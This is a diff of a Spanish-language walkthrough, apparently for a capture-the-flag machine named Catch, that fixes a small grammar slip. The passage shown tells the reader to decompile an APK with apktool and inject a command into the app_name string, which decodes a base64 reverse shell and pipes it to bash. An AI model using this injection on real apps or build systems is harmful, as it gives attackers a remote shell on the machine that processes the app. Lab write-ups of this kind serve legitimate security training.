@@ -14,7 +14,7 @@ siguientes comandos:
 java -jar apktool_2.6.1.jar d catchv1.0.apk
 nano catchv1.0/res/values/strings.xml
 ```
-2. Busca la linea **< string name="app_name" >Catch</ string >** y agregar una reverse shell despues Catch quedando asi 
+2. Busca la linea **< string name="app_name" >Catch</ string >** y agregar una reverse shell despues de Catch quedando asi 
 **< string name="app_name" >Catch; echo** << Reverse Shell en base64 >> **| base64 -d | bash -i</ string >**
 
 **Reverse shell en base64**
